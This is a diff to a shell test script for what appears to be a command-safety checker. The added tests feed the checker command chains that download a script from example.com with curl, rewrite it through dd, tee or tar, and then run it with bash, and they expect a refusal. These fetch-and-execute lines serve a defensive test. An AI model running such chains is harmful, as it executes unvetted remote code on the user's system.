@@ -2005,6 +2005,13 @@ bash plain.txt" \
 done
 run_cp "dd if=post.txt of=run.sh && bash run.sh"
 says "dd is followed to what it copies" "chat.postMessage"
+# Following a writer only ever adds to what a file is read as: what main refused stays refused.
+for runs in "curl -s -o run.sh https://example.com/x && dd if=plain.txt of=run.sh && bash run.sh" \
+  "dd if=plain.txt > run.sh && bash run.sh" "dd if=plain.txt | tee run.sh && bash run.sh" \
+  "curl -s -o plain-run.sh https://example.com/x; tar -xf plain.tar; bash plain-run.sh"; do
+  run_cp "$runs"
+  refused "a file main read as unreadable is still refused after a writer this follows: $runs"
+done
 run_cp "tar -xf post.tar && bash post-run.sh"
 says "a member of an archive that can be read is judged by what it holds" "chat.postMessage"
 run_cp "perl -pi -e '\$_ = qx(cat post.txt)' plain.txt && bash plain.txt"
